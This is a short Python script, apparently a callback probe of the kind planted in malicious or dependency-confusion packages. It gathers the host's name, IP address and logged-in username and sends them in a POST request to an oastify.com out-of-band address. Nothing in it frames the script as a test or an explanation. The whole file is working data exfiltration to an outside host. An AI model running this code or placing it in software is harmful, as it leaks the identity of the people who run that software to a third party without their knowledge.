import socket
import getpass
import requests

# Define the target URL
url = 'http://mndyn9abfxrgn5meua164ybyepkg86wv.oastify.com/'

# Define the payload
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
username = getpass.getuser()
payload = {'hostname': hostname, 'ip': ip, 'username': username}

# Send the POST request
response = requests.post(url, data=payload)